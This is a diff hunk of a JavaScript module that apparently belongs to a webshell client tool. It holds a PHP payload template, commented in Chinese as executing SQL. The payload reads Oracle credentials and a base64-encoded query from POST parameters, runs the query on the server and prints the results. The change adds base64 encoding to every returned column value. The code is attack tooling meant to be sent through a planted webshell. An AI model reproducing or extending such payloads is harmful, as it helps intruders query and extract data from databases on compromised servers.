@@ -38,7 +38,7 @@ module.exports = {
   // 执行SQL语句
   query: {
     _:
-      `$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];$usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];$pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];$dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];$sql=base64_decode($_POST["${arg5}"]);$H=@ora_plogon("{$usr}@{$sid}","{$pwd}");if(!$H){echo("ERROR:// Login Failed!");}else{$T=@ora_open($H);@ora_commitoff($H);$q=@ora_parse($T,"{$sql}");$R=ora_exec($T);if($R){$n=ora_numcols($T);for($i=0;$i<$n;$i++){echo(Ora_ColumnName($T,$i)."\t|\t");}echo("\r\n");while(ora_fetch($T)){for($i=0;$i<$n;$i++){echo(trim(ora_getcolumn($T,$i)));echo("\t|\t");}echo("\r\n");}}else{echo("ErrMsg\t|\t\r\n");}@ora_close($T);};`,
+      `$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];$usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];$pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];$dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];$sql=base64_decode($_POST["${arg5}"]);$H=@ora_plogon("{$usr}@{$sid}","{$pwd}");if(!$H){echo("ERROR:// Login Failed!");}else{$T=@ora_open($H);@ora_commitoff($H);$q=@ora_parse($T,"{$sql}");$R=ora_exec($T);if($R){$n=ora_numcols($T);for($i=0;$i<$n;$i++){echo(Ora_ColumnName($T,$i)."\t|\t");}echo("\r\n");while(ora_fetch($T)){for($i=0;$i<$n;$i++){echo(base64_encode(trim(ora_getcolumn($T,$i))));echo("\t|\t");}echo("\r\n");}}else{echo("ErrMsg\t|\t\r\n");}@ora_close($T);};`,
     [arg1]: '#{host}',
     [arg2]: '#{user}',
     [arg3]: '#{passwd}',
